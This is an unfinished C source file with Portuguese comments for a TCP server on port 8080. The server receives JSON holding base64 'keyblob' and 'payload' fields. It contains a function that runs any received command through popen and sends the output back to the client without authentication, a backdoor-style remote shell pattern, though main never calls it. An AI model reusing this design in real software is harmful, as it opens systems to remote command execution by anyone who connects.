#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#include <cjson/cJSON.h>  // lib cJSON

#define PORT 8080

// Função para decodificar base64
unsigned char *base64_decode(const char *input, int *len) {
    BIO *b64, *bmem;
    int input_len = strlen(input);
    unsigned char *buffer = malloc(input_len);
    memset(buffer, 0, input_len);

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new_mem_buf((void *)input, input_len);
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    *len = BIO_read(bmem, buffer, input_len);
    BIO_free_all(bmem);

    return buffer;
}

// Executa o comando recebido e envia de volta a saída
void execute_command(const char *cmd, int client_sock) {
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        char *err = "Erro ao executar comando\n";
        send(client_sock, err, strlen(err), 0);
        return;
    }

    char output[1024];
    while (fgets(output, sizeof(output), fp) != NULL) {
        send(client_sock, output, strlen(output), 0);
    }

    pclose(fp);
}

int main() {
    int sockfd, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[4096] = {0};

    // Cria socket TCP
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    listen(sockfd, 1);

    printf("Servidor escutando na porta %d...\n", PORT);

    client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
    printf("Cliente conectado!\n");

    // Recebe JSON
    recv(client_sock, buffer, sizeof(buffer), 0);

    // Parse do JSON recebido
    cJSON *json = cJSON_Parse(buffer);
    if (!json) {
        fprintf(stderr, "Erro ao parsear JSON\n");
        close(client_sock);
        return 1;
    }

    const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
    const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;

    return 0;
}
